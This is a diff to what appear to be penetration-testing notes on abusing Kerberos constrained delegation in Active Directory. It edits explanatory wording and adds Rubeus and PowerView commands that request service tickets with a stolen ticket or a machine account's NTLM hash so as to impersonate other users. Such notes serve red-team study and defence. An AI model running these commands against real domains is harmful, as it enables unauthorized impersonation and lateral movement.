@@ -686,8 +686,8 @@ klist
 * * *
 
 # Constrained Delegation
-This is when a TGT can be forwarded to only a specified User/Service/Machine/Resource.
-It also introduces s4u - which allows a Service to request a TGS for itself on behalf of a user who may or may not be authenticating via Kerberos
+This is when a TGT can be forwarded only to a specified Service defined in the specific User/Machine/Resource msds-allowedtodelegateto property.
+It also introduces s4u - which allows a Service to request a TGS for itself on behalf of a user who may or may not be authenticating via Kerberos.
 
 ```Get-DomainUser –TrustedToAuth```
 
@@ -717,6 +717,8 @@ tgs::s4u /tgt:CERT_WE_STOLE.kirbi
 ```
 * * * 
 
+#### SFU - constrained delegation user 
+
 Rubeus (can put ```/ptt``` to pass ticket now):
 ```Rubeus.exe s4u /ticket:CERT_WE_STOLE.kirbi /impersonateuser:user_we_are_impersonating /msdsspn:ServiceListedIn{msDS-AllowedToDelegateTo}```
 
@@ -730,9 +732,9 @@ https://github.com/GhostPack/Rubeus#tgtdeleg
 
 ```klist```
 
+#### SFU - constrained delegation machine
 
-
-NOW - we could just do it all in one RUBEUS command:
+We could also just do it all in one RUBEUS command e.g., constrained delegation machine in possession of machine account NTLM hash:
 
 ```Rubeus.exe s4u /user:WEBSRV01$ /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:SQLDatabase```
 
